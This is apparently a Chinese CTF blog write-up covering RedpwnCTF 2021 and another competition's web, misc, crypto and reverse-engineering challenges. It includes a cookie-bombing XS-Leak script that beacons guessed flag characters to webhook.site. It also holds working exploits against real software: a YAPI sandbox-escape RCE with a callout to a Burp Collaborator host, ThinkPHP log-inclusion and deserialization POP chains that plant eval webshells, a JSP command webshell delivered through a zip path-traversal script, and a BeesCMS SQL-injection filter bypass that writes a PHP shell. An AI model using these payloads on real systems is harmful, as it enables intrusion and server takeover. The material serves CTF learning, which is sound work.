cookies）通常会阻止这种情况，但由于题中的sandbox是子域，并不是同站的情况，所以probeError可以检测到，下面是脚本\nconst alphabet = \u0026#34;abcdefghijklmnopqrstuvwxyz0123456789{}_ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#34;; function set() { document.cookie = `a=${\u0026#39;a\u0026#39;.repeat(4096-90)}; domain=.pastebin-3.mc.ax` document.cookie = `b=${\u0026#39;a\u0026#39;.repeat(4096-90)}; domain=.pastebin-3.mc.ax` } function unset() { document.cookie = `a=; domain=.pastebin-3.mc.ax` document.cookie = `b=; domain=.pastebin-3.mc.ax` } function probeError(url) { return new Promise(resolve =\u0026gt; { let script = document.createElement(\u0026#39;script\u0026#39;); script.src = url; script.onload = () =\u0026gt; resolve(false); script.onerror = () =\u0026gt; resolve(true); document.head.appendChild(script); }); } function wait(time) { return new Promise(resolve =\u0026gt; { setTimeout(resolve, time); }); } (async () =\u0026gt; { let prefix = \u0026#34;flag{c00k13_b0mb1n6_15_f4k3_vu\u0026#34;; set(); navigator.sendBeacon(\u0026#39;https://webhook.site/e66e7e4f-1004-411a-86c9-71df69f20dd7?loaded\u0026#39;); while (!prefix.endsWith(\u0026#39;}\u0026#39;)) { for (let i = 0; i \u0026lt; alphabet.length; i++) { let attempt = prefix + alphabet[i]; let subwindow = window.open(\u0026#34;https://pastebin-3.mc.ax/search?query=\u0026#34; + encodeURIComponent(attempt)); await wait(500); subwindow.close(); if (await probeError(\u0026#34;https://pastebin-3.mc.ax/home\u0026#34;)) { navigator.sendBeacon(\u0026#39;https://webhook.site/e66e7e4f-1004-411a-86c9-71df69f20dd7?\u0026#39; + attempt); unset(); prefix = attempt; break; } } } })(); 为了引入这个脚本，我们新建一个paste\n${import(String.fromCharCode(47).repeat(2) + /brycec.me/.source + String.fromCharCode(47) + /pwn.js/.source)} 其他几个版本的脚本：ver2 ver3\n参考：XSLeaks | Side Channel Vulnerabilities on the Web - Detection and Preventio | Flask 消息闪现\nweb/wtjs  Ya like golf? How about JS golf?\nwtjs.mc.ax | Admin bot\nDownloads: wtjs.tar\n ………………有字数限制的fuckjs，我不会构造 太痛苦了\nwp参见一张google sheet wp2\n不得不说，这个sheet真的是相当清晰了……用9张表 详细的写了一下到底是怎么把最终的payload给拼出来的，真的是现代版活字印刷 绝了 数字民工是吧😅\n属实是蚌埠住了😅\n***web/MdBin  Need a nice, customizable pastebin service for all those markdown notes you need to share? Look no further! Powered by the latest in Web Technologies™, including React, this pastebin has you covered, with brand-new theming support!\nmdbin.mc.ax\nSubmit to the admin at admin-bot.mc.ax/mdbin; the flag is in a cookie.\nDownloads: mdbin.tar.gz\n 参考：wp1 wp2\n直接放参考的wp链接吧，还是js原型污染的问题，但是由于我对js原型污染这个问题了解的不够深入，也只能照猫画虎的复现，还有很多资料需要额外的去补充地看，就不班门弄斧了，上面的两个链接里写的都很好！\n***web/lazy-admin  Looks like another service with no functionality. I hope the admin is doing their job\u0026hellip;\nlazy-admin.mc.ax\nDownloads: lazy-admin.tar.gz\n 参考：wp\n难，我不懂\nmisc/sanity-check  I get to write the sanity check challenge! Alright!\nflag{1_l0v3_54n17y_ch3ck_ch4ll5}\n misc/discord  Join the discord! I hear #rules is an incredibly engaging read.\n misc/compliant-lattice-feline  get a flag! nc mc.ax 31443\n *misc/the-substitution-game  nc mc.ax 31996\nDownloads: chall.py\n Markov Algorithm罢了\n参见：Markov Algorithm Online\nmisc/annaBEL-lee  sounds from a kingdom by the sea\nThe server does not produce any visible output; please take a close look at what it is sending before asking if the server is broken.\nWhat exactly is the server sending? Sometimes it makes a sound, sometimes it doesn\u0026rsquo;t. Plotting it on a chart might help you see something.\nIt might be helpful to turn your sound on, but you\u0026rsquo;ll probably want to write all of it down since your terminal might not catch everything fast enough—maybe slow it down to get a better idea.\nThis is not audio steganography. Apologies if anyone went down that route.\nnc mc.ax 31845\n nc连入后没有任何可视的回显，但是藏在了声音信息里\n\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00 导出，有两种值：no bell(\\x00) bell(\\x07)，转化为0与1\n101110101000100011100011100010001011101000101010000000101110101000111011101110001011101110001000101110100011101110101011101110000000111010111010001010101000101110001110100011101110100010000000101110111010001011100010111010001000111010001010100000001110001110111011100000001110101110100010101110001011101000101110101000111010111011100011101110111010101000000010101110100010111010100010111000111011101000111010111011101000111010100010111011101110111000111010001110111010001110101010101110001110101000111011101110111011100011101000111011101110111010001110101010101110001110111010001110111011101110111000100010101000111010101010111000111000101010100010101011101110001110101010101110001011100011101000111010001011100011101010101011100011101010100010101011101110001011101010001110101110111010111000 改为莫斯电码的样子\n.-.. . - - . .-. ... | .-.. --- .-- . .-. --..-- | -.-. .... .- -. --. . | .--. .- .-. . -. ... | - --- | -.-. ..- .-. .-.. -.-- ---... | ..-. .-.. .- --. -.--. -.. .---- -. --. -....- -.. ----- -. ----. -....- --. ----- . ... -....- - .... ...-- -....- .- -. -. .- -....- -... ...-- .-.. -.--.- 解密\nLETTERS LOWER, CHANGE PARENS TO CURLY: FLAG(D1NG-D0N9-G0ES-TH3-ANNA-B3L) flag{d1ng-d0n9-g0es-th3-anna-b3l}\ncrypto/scissor  I was given this string and told something about scissors. egddagzp_ftue_rxms_iuft_rxms_radymf\nDownloads: encrypt.py\n crypto/baby  I want to do an RSA!\nDownloads: output.txt\n n: 228430203128652625114739053365339856393 e: 65537 c: 126721104148692049427127809839057445790 一点都不会crypto…… 其实查一下RSA n e c其实就能做出来后面的东西了\nRSA decryption using only n e and c 然后就会知道这个东西 Ganapati/RsaCtfTool，或者这个在线网站 RSA Cipher\n为了decode首先需要根据N求出两个互质的p和q，可以用这个网站来做 整数分解工具\n之后就可以愉快的解密了！\nrev/wstrings  Some strings are wider than normal\u0026hellip;\nDownloads: wstrings\n flag{n0t_al1_str1ngs_ar3_sk1nny}\nrev/bread-making  My parents aren\u0026rsquo;t home! Quick, help me make some bread please\u0026hellip; nc mc.ax 31796\nDownloads: bread\n 参考：wp2 wp3 wp4\n我当时的思路和想法大致还是对的，~~（虽然没有做出来吧）~~这个就是先提取出文件中的字符串部分，然后用逻辑 在交互模式下用正确的顺序输入 完整的顺下来这个流程，最后拿到flag，最后的正确顺序是这样的\nadd ingredients to the bowl add flour add yeast add salt add water hide the bowl inside a box wait 3 hours work in the basement preheat the toaster oven set a timer on your phone watch the bread bake pull the tray out with a towel unplug the fire alarm open the window unplug the oven clean the counters flush the bread down the toilet wash the sink get ready to sleep close the window replace the fire alarm brush teeth and go to bed The flag is: flag{m4yb3_try_f0ccac1a_n3xt_t1m3???0r_dont_b4k3_br3ad_at_m1dnight}\n调试的过程是linux下的py脚本\nfrom pwn import * p = remote(\u0026quot;mc.ax\u0026quot;, 31796) p.sendlineafter(\u0026quot;bowl\u0026quot;, \u0026quot;add flour\u0026quot;) p.sendlineafter(\u0026quot;flour has been added\u0026quot;, \u0026quot;add yeast\u0026quot;) p.sendlineafter(\u0026quot;yeast has been added\u0026quot;, \u0026quot;add salt\u0026quot;) p.sendlineafter(\u0026quot;salt has been added\u0026quot;, \u0026quot;add water\u0026quot;) p.sendlineafter(\u0026quot;lumpy dough\u0026quot;, \u0026quot;hide the bowl inside a box\u0026quot;) p.sendlineafter(\u0026quot;to rise\u0026quot;, \u0026quot;wait 3 hours\u0026quot;) p.sendlineafter(\u0026quot;finish the dough\u0026quot;, \u0026quot;work in the basement\u0026quot;) p.sendlineafter(\u0026quot;needs to be baked\u0026quot;, \u0026quot;preheat the toaster oven\u0026quot;) p.sendlineafter(\u0026quot;for 45 minutes\u0026quot;, \u0026quot;set a timer on your phone\u0026quot;) p.sendlineafter(\u0026quot;awfully long time\u0026quot;, \u0026quot;watch the bread bake\u0026quot;) p.sendlineafter(\u0026quot;no time to waste\u0026quot;, \u0026quot;pull the tray out with a towel\u0026quot;) p.sendlineafter(\u0026quot;smoke in the air\u0026quot;, \u0026quot;unplug the fire alarm\u0026quot;) p.sendlineafter(\u0026quot;in another room\u0026quot;, \u0026quot;open the window\u0026quot;) p.sendlineafter(\u0026quot;air rushes in\u0026quot;, \u0026quot;unplug the oven\u0026quot;) p.sendlineafter(\u0026quot;kitchen is a mess\u0026quot;, \u0026quot;wash the sink\u0026quot;) p.sendlineafter(\u0026quot;sink is cleaned\u0026quot;, \u0026quot;clean the counters\u0026quot;) p.sendlineafter(\u0026quot;counters are cleaned\u0026quot;, \u0026quot;flush the bread down the toilet\u0026quot;) p.sendlineafter(\u0026quot;is disposed of\u0026quot;, \u0026quot;get ready to sleep\u0026quot;) p.sendlineafter(\u0026quot;go to sleep\u0026quot;, \u0026quot;close the window\u0026quot;) p.sendlineafter(\u0026quot;window is closed\u0026quot;, \u0026quot;replace the fire alarm\u0026quot;) p.sendlineafter(\u0026quot;alarm is replaced\u0026quot;, \u0026quot;brush teeth and go to bed\u0026quot;) p.interactive() p.close() 这个脚本的逻辑是通过bread文件导出的文本，找出最符合逻辑的上下文 然后利用sendlineafer来解题；实际做题的话不可能只靠打字来试这个顺序 不是说试这个浪费时间 而是等待的时间非常非常短暂 没有完整打完字的时间\n后记 这次的redpwn有47道题，各个方向都有适合我这种签到选手的简单题，好评~\n就是打星号的题涉及到的js原型污染问题，光靠这一两个题搞不太懂，但是最近的反序列化问题还没总结完，三心二意的也不太好，但是之后一定会回来看的！！！等着被鞭尸吧 哼\n","date":"2021-08-08T20:08:39+08:00","permalink":"https://amiaaaz.github.io/2021/08/08/redpwn2021-wp/","section":"posts","tags":["wp"],"title":"RedpwnCTF2021 Wp"},{"categories":["CTF"],"contents":"cat flag  简简单单cat flag\nHint: 管理员曾访问过flag\n \u0026lt;?php if (isset($_GET[\u0026#39;cmd\u0026#39;])) { $cmd = $_GET[\u0026#39;cmd\u0026#39;]; if (!preg_match(\u0026#39;/flag/i\u0026#39;,$cmd)) { $cmd = escapeshellarg($cmd); system(\u0026#39;cat \u0026#39; . $cmd); } } else { highlight_file(__FILE__); } ?\u0026gt;提示管理员访问过，先cat /var/log/nginx/access.log\n之后用%fa绕过 /?cmd=this_is_final_fl%faag_e2a457126032b42d.php\nreview - Nginx 重要文件目录：\n 配置文件存放目录：/etc/nginx 主要配置文件：/etc/nginx/conf/nginx.conf 管理脚本：/usr/lib64/systemd/system/nginx.service 模块：/usr/lisb64/nginx/modules 应用程序：/usr/sbin/nginx 程序默认存放位置：/usr/share/nginx/html 日志默认存放位置：/var/log/nginx/access.log  ezrce  你真的会 nodejs 吗？\n 是一个YAPI的主页，根据题目里rce的提示 搜搜看已知的漏洞：Yapi 存在远程命令执行漏洞\n那就好办了 跟着来就行咯；首先创建一个项目\n之后修改全局mock脚本\nconst sandbox = this const ObjectConstructor = this.constructor const FunctionConstructor = ObjectConstructor.constructor const myfun = FunctionConstructor(\u0026#39;return process\u0026#39;) const process = myfun() mockjson = process.mainModule.require(\u0026#34;child_process\u0026#34;).execSync(\u0026#34;command\u0026#34;).toString() 之后添加接口\n脚本中的execSync()处可rce，先用wget http://xxxxx.burpcollaborator.net试试水\n很顺利嘛 好耶！\ncat `ls`\t// spawnSync /bin/sh ENOBUFS cat `cd ../;ls`\t// config.json, init.lock, log, vendors cat `cd ../../;ls`\t// app, bin, boot, dev, etc, ffffffflllllaggggg, home, lib, lib64, media, mnt, opt, proc, root, run, sbin, srv, start.sh, tmp, usr, var cd ../../;cat `ls`\t// app, bin,boot, dev, etc, home, lib, lib64, media, mnt,opt, proc, root, run, sbin, srv, sys, tmp, usr, var cat `cd ../../;cat ffffffflllllaggggg`\t// flag{5d096f4f-8c32-49b6-bed4-b485eb1cf08b} easythinkphp  easythinkphp\n 只有一个thinkphp 3.2.3的欢迎页面，tp的洞很多 可以直接拿来打，参考：【漏洞通报】ThinkPHP3.2.x RCE漏洞通报\n/index.php?m=--\u0026gt;\u0026lt;?=phpinfo();?\u0026gt; /index.php?m=Home\u0026amp;c=Index\u0026amp;a=index\u0026amp;value[_filename]=./Application/Runtime/Logs/Common/21_08_01.log 先验证一下文档中的方法，成功，之后把phpinfo换成自己的一句话木马\n/index.php?m=--\u0026gt;\u0026lt;?=eval($_POST['wuhu']);?\u0026gt; 传入后 用蚁剑连接就能拿flag了~\n或者也可以直接使用ThinkphpGUI一把梭！一键getshell 你值得拥有\njspxcms 也有现成的洞可以直接用，参考：复现jspxcms解压getshell漏洞 | 代码审计| Jspxcms文件上传漏洞(CNVD-2019-40540) | 记一次由追踪溯源发现的“不安全解压getshell”\n首先构造含jsp🐎的恶意war包，🐎长这样\n\u0026lt;% if(\u0026quot;023\u0026quot;.equals(request.getParameter(\u0026quot;pwd\u0026quot;))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\u0026quot;wuhu\u0026quot;)).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(\u0026quot;\u0026lt;pre\u0026gt;\u0026quot;); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(\u0026quot;\u0026lt;/pre\u0026gt;\u0026quot;); } %\u0026gt; 之后放入一个解压后会自动完成目录穿越的zip包中 这个过程由py脚本完成\nimport zipfile if __name__ == \u0026#34;__main__\u0026#34;: try: binary = b\u0026#39;\u0026lt;script\u0026gt;alert(\u0026#34;helloworld\u0026#34;)\u0026lt;/script\u0026gt;\u0026#39; zipFile = zipfile.ZipFile(\u0026#34;test123.zip\u0026#34;, \u0026#34;a\u0026#34;, zipfile.ZIP_DEFLATED) info = zipfile.ZipInfo(\u0026#34;test123.zip\u0026#34;) zipFile.writestr(\u0026#34;../../../../dog123.html\u0026#34;, binary) zipFile.close() except IOError as e: raise e import zipfile z = zipfile.ZipFile(\u0026#39;test123.zip\u0026#39;, \u0026#39;a\u0026#39;, zipfile.ZIP_DEFLATED) with open(\u0026#39;wuhu.war\u0026#39;, \u0026#39;rb\u0026#39;)as f: temp = f.read() z.writestr(\u0026#39;../../../../wuhu.war\u0026#39;, temp) z.close() 需要注意的是 最终我们要穿越到的目录是网站根目录的上层，即webapps目录下 与ROOT目录同级，当war包位于这个目录下才会自动部署\n直接cat /flag就好啦\ncybercms  赛博CMS，只为安全而生\nHint：信息搜集是一个web手必备的技能\n 一个（伪）cms平台介绍的页面，比较简陋，首页/应用案例处显示hacked by ymnh，在ymnh的咨询页面处有这样的报错\n在首页/新闻动态处，几乎所有的帖子都是hacked by xxx~~（本来我还以为是多么复杂的长篇大论）~~，在如何安装和使用模板这篇下有没删干净的东西\n如何设置进站语言这篇里竟然是这样的草 真是蚌埠住了 图穷匕见了属于是2333333\n根据这些，可以得知整个站是完全移植/套壳beescms的 所以接着去找已存在的洞，参考：Beescms_v4.0 sql注入漏洞分析\n在admin后加单引号，提示表名是bees_admin，有id, admin_name, admin_password, admin_purview, is_disable共5个字段\n简单fuzz可知：过滤了空格（用/**/绕过）（或者用tab绕过 或者%0a绕过 都可以），过滤了select, outfile（双写绕过），对尖括号转义为html实体（用hex绕过）\nuser=admin'/**/union/**/selselectect/**/1,2,3,4,5# 回显正常，接着尝试写入shell（这里要写清楚绝对路径，在上面的一张报错的页面也有所提示了）\nadmin'/**/union/**/selselectect/**/1,2,3,4,0x3c3f3d6576616c28245f504f53545b2777756875275d293b3f3e/**/into/**/ououtfiletfile/**/'/var/www/html/wuhu.php'# 好耶，连蚁剑拿flag咯\nez_website  简单的题目\n 也是现实世界存在的东西，参考：齐博建站系统x1.0代码审计\n直接用已有的链子打\n\u0026lt;?php namespace think\\process\\pipes { class Windows { private $files = []; public function __construct($files) { $this-\u0026gt;files = [$files]; //$file =\u0026gt; /think/Model的子类new Pivot(); Model是抽象类  } } } namespace think { abstract class Model{ protected $append = []; protected $error = null; public $parent; function __construct($output, $modelRelation) { $this-\u0026gt;parent = $output; //$this-\u0026gt;parent=\u0026gt; think\\console\\Output;  $this-\u0026gt;append = array(\u0026#34;xxx\u0026#34;=\u0026gt;\u0026#34;getError\u0026#34;); //调用getError 返回this-\u0026gt;error  $this-\u0026gt;error = $modelRelation; // $this-\u0026gt;error 要为 relation类的子类，并且也是OnetoOne类的子类==\u0026gt;\u0026gt;HasOne  } } } namespace think\\model{ use think\\Model; class Pivot extends Model{ function __construct($output, $modelRelation) { parent::__construct($output, $modelRelation); } } } namespace think\\model\\relation{ class HasOne extends OneToOne { } } namespace think\\model\\relation { abstract class OneToOne { protected $selfRelation; protected $bindAttr = []; protected $query; function __construct($query) { $this-\u0026gt;selfRelation = 0; $this-\u0026gt;query = $query; //$query指向Query  $this-\u0026gt;bindAttr = [\u0026#39;xxx\u0026#39;];// $value值，作为call函数引用的第二变量  } } } namespace think\\db { class Query { protected $model; function __construct($model) { $this-\u0026gt;model = $model; //$this-\u0026gt;model=\u0026gt; think\\console\\Output;  } } } namespace think\\console{ class Output{ private $handle; protected $styles; function __construct($handle) { $this-\u0026gt;styles = [\u0026#39;getAttr\u0026#39;]; $this-\u0026gt;handle =$handle; //$handle-\u0026gt;think\\session\\driver\\Memcached  } } } namespace think\\session\\driver { class Memcached { protected $handler; function __construct($handle) { $this-\u0026gt;handler = $handle; //$handle-\u0026gt;think\\cache\\driver\\File  } } } namespace think\\cache\\driver { class File { protected $options=null; protected $tag; function __construct(){ $this-\u0026gt;options=[ \u0026#39;expire\u0026#39; =\u0026gt; 3600, \u0026#39;cache_subdir\u0026#39; =\u0026gt; false, \u0026#39;prefix\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;path\u0026#39; =\u0026gt; \u0026#39;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../runtime/temp/a.php\u0026#39;, \u0026#39;data_compress\u0026#39; =\u0026gt; false, ]; $this-\u0026gt;tag = \u0026#39;xxx\u0026#39;; } } } namespace { $Memcached = new think\\session\\driver\\Memcached(new \\think\\cache\\driver\\File()); $Output = new think\\console\\Output($Memcached); $model = new think\\db\\Query($Output); $HasOne = new think\\model\\relation\\HasOne($model); $window = new think\\process\\pipes\\Windows(new think\\model\\Pivot($Output,$HasOne)); echo urlencode(serialize($window)); } 上传\n/index.php/index/labelmodels/get_label?tag_array[cfg]=O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3Bs%3A8%3A%22getError%22%3B%7Ds%3A8%3A%22%00%2A%00error%22%3BO%3A27%3A%22think%5Cmodel%5Crelation%5CHasOne%22%3A3%3A%7Bs%3A15%3A%22%00%2A%00selfRelation%22%3Bi%3A0%3Bs%3A11%3A%22%00%2A%00bindAttr%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22xxx%22%3B%7Ds%3A8%3A%22%00%2A%00query%22%3BO%3A14%3A%22think%5Cdb%5CQuery%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00model%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A3600%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A135%3A%22php%3A%2F%2Ffilter%2Fconvert.iconv.utf-8.utf-7%7Cconvert.base64-decode%2Fresource%3DaaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g%2F..%2Fruntime%2Ftemp%2Fa.php%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bs%3A3%3A%22xxx%22%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7D%7D%7Ds%3A6%3A%22parent%22%3Br%3A11%3B%7D%7D%7D 虽然会返回一个报错的页面，但是可以在/index.php/index/image/headers?url=file:///var/www/html/runtime/temp/a.php12ac95f1498ce51d2d96a249c09c1998.php处验证一下是否写上了🐎，文件名字是md5('tag_'.md5($this-\u0026gt;tag))，连接密码是ccc 直接蚁剑\n在雪殇的wp中用的是另一个，更直接的写🐎方式，下面说一下思路（大概\n我们可以先尝试看看敏感函数file_put_contents()是否能利用\n在application/admin/controller/Upgrade.php下看到了文件写入的函数，它位于在writelog()中，这个函数的功能是处理post请求传入的各项参数\n这个config('client_upgrade_edition')捏，跟了一下 它会返回null，再往上看到_initialize()\n所以最后是会将$upgrade_edition写入中/runtime/client_upgrade_edtion.php中；而整个writelog()函数会被sysup()调用\n跟进这个sysup()和$upgrade_edtion，看是否可用+如何用\n在template/admin_style/default/admin/upgrade/index.htm下看到了确实存在的路由，这个的页面是在后台管理中心 - 系统功能 - 系统在线升级处，随便升一个看看\n抓包之后看到这里确实有post访问和upgrade_edtion参数，那就稳了，直接写🐎\n/admin.php/admin/upgrade/sysup.html?upgrade_edition=%22,%22%22=%3E-eval($_POST[%27cmd%27])-%22,];?%3E// 将🐎写进的目标页面/runtime/client_upgrade_edition.php连入蚁剑 拿flag即可\n————比赛的时候我其实是没有搜到齐博建站系统x1.0代码审计这篇的，当时思路是在后台在找有没有可以利用的地方直接写🐎 ，当时找的是独立页管理，尝试upload，但是并不太行（也可能是我太菜了），然后也没去审代码（懒狗）所以 就没出这个题，现在看还是疏忽了 确实完全没注意到系统在线升级这个模块是可用的 也没有认真的分析源码 我的过\n安全,安全,还是xxx的安全  某个特别安全的商店\nHint:\nCREATE TABLE \u0026#34;users\u0026#34; ( \u0026#34;id\u0026#34; INTEGER NOT NULL, \u0026#34;username\u0026#34; TEXT UNIQUE , \u0026#34;login_password\u0026#34; text, \u0026#34;money\u0026#34; INTEGER, \u0026#34;pay_password\u0026#34; TEXT, \u0026#34;flag_num\u0026#34; INTEGER, PRIMARY KEY (\u0026#34;id\u0026#34;) ); CREATE TABLE \u0026#34;flaaaaaaaaag\u0026#34; ( \u0026#34;flllllllag\u0026#34; TEXT );  特别简陋的前端，有登录和注册和主页三个页面，登录处有一定过滤 存在sqli任意注册账号，走一波流程\n😅蚌埠住了\n回过头来看一下Burp对刚才操作的抓包结果，从cookie可以知道后端是flask框架 ，flask的话一般标配sqlite数据库，然后看下页面源码\n注册时用post提交信息，密码部分用的是md5(app.users.password+'CBCTF')，支付密码是encrsa(app.users.pay_password)，好家伙 这个加密 pay_password部分md5+rsa+b64\u0026hellip;\u0026hellip;\n————比赛的时候基本就停到这里了，感觉是sqli 但是不知道怎么注 全是md5的，以下是参考wp之后的复现\n赛后讲题的时候 出题师傅说参考的是这一篇文章数据加密或成WAF失效最大元凶…（原帖被404了 只有个快照 还是百度快照才能看 而且没图）核心是这一段\n这个题的flag购买小站，对pay_password是进行前端md5+rsa+b64加密，后端再对应着拿私钥解密，存入数据库的是md5值，看似很完美 但是其实根本没有waf的介入 没有对参数进行任何过滤，如果我们从中间介入 只保留rsa+b64的部分 